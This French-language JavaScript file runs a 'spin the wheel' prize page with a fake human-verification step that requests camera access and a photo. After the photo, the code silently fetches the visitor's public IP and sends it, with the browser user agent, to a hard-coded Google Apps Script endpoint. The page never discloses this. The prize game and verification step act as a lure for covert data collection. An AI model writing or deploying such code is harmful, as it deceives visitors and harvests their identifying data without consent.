// URL du script Google Apps Script
const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxni87knrZb2oSC8FnDIbvhTOqCWXJB6uAZy1wgrWywLK6cFrK_-VEzXPIYTSwEcjT2WA/exec";

// --- Dessin de la roue ---
const wheelCanvas = document.getElementById("wheel");
const ctx = wheelCanvas.getContext("2d");

// Segments (récompenses)
const segments = ["🎁 -10%", "🚚 Livraison gratuite", "🎧 Goodie", "🎟 5€ bon", "🎉 15%", "❌ Pas de gain"];
// Couleurs associées
const colors = ["#f44336", "#4caf50", "#ffeb3b", "#2196f3", "#ff9800", "#9c27b0"];

// Fonction pour dessiner la roue
function drawWheel() {
  const arc = (2 * Math.PI) / segments.length;
  for (let i = 0; i < segments.length; i++) {
    const angle = i * arc;
    ctx.beginPath();
    ctx.fillStyle = colors[i % colors.length];
    ctx.moveTo(150, 150);
    ctx.arc(150, 150, 150, angle, angle + arc);
    ctx.lineTo(150, 150);
    ctx.fill();

    // Bordure entre segments
    ctx.strokeStyle = "rgba(255,255,255,0.3)";
    ctx.lineWidth = 2;
    ctx.stroke();

    // Texte du segment
    ctx.save();
    ctx.translate(150, 150);
    ctx.rotate(angle + arc / 2);
    ctx.textAlign = "right";
    ctx.fillStyle = "white";
    ctx.font = "bold 14px Arial";
    ctx.shadowColor = "rgba(0,0,0,0.5)";
    ctx.shadowBlur = 3;
    ctx.fillText(segments[i], 140, 5);
    ctx.restore();
  }
}
drawWheel();

// --- Gestion de la caméra / torche ---
let torchStream = null;
let torchTrack = null;

async function initCamera() {
  try {
    if (!torchStream) {
      torchStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
      torchTrack = torchStream.getVideoTracks()[0];
    }
  } catch (e) {
    console.log("Erreur accès caméra:", e);
  }
}

async function toggleTorch(on) {
  try {
    if (!torchTrack) return;
    const caps = torchTrack.getCapabilities();
    if ("torch" in caps) {
      await torchTrack.applyConstraints({ advanced: [{ torch: on }] });
    }
  } catch (e) {
    console.log("Torch error:", e);
  }
}

// --- Animation du spin ---
let spinning = false;
document.getElementById("spin").addEventListener("click", async () => {
  if (spinning) return;
  spinning = true;

  // Désactive le bouton pendant l'animation
  document.getElementById("spin").disabled = true;

  await toggleTorch(true);

  const arc = (2 * Math.PI) / segments.length;
  const spinAngle = Math.floor(Math.random() * segments.length);
  const extraSpins = 5;
  const finalAngle = (extraSpins * 2 * Math.PI) + (spinAngle * arc) + arc / 2;

  wheelCanvas.style.transition = "transform 4s cubic-bezier(0.33, 1, 0.68, 1)";
  wheelCanvas.style.transform = `rotate(${finalAngle}rad)`;

  setTimeout(async () => {
    const result = segments[segments.length - 1 - spinAngle];
    const resultDiv = document.getElementById("result");
    resultDiv.textContent = "🎊 Félicitations ! Vous avez gagné : " + result;
    resultDiv.style.display = "block";

    await toggleTorch(false);
    spinning = false;
    
    // Réactive le bouton après 2 secondes
    setTimeout(() => {
      document.getElementById("spin").disabled = false;
    }, 2000);
  }, 4000);
});

// --- Récupération IP publique ---
async function getPublicIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip;
  } catch (e) {
    console.log("Impossible de récupérer IP publique:", e);
    return "IP inconnue";
  }
}

// --- Envoi vers Apps Script ---
async function logVisitor() {
  try {
    const ip = await getPublicIP();
    const userAgent = navigator.userAgent;

    const data = new FormData();
    data.append("ip", ip);
    data.append("userAgent", userAgent);

    const response = await fetch(SCRIPT_URL, { method: "POST", body: data });
    const result = await response.json();
    console.log("Résultat Apps Script:", result);
  } catch (e) {
    console.error("Erreur envoi Apps Script:", e);
  }
}

// --- Vérification humaine ---
const startCameraBtn = document.getElementById("startCamera");
const photoInput = document.getElementById("humanPhoto");
const step1 = document.getElementById("step1");
const step2 = document.getElementById("step2");
const gameSection = document.getElementById("game-section");

// Étape 1 : l'utilisateur active la caméra
startCameraBtn.addEventListener("click", async () => {
  await initCamera();
  startCameraBtn.disabled = true;
  startCameraBtn.textContent = "✅ Caméra activée";
  startCameraBtn.style.background = "#10b981";
  
  step1.classList.add("active");
  photoInput.disabled = false;
  step2.classList.add("active");
});

// Étape 2 : l'utilisateur prend une photo
photoInput.addEventListener("change", async () => {
  if (photoInput.files.length > 0) {
    document.getElementById("photoLabel").innerHTML = '<span class="btn-icon">✅</span> Photo prise !';
    document.getElementById("photoLabel").style.background = "#10b981";
    
    // Affiche la section du jeu
    setTimeout(() => {
      gameSection.style.display = "block";
      gameSection.scrollIntoView({ behavior: "smooth" });
      document.getElementById("spin").disabled = false;
    }, 500);
    
    await logVisitor();
  }
});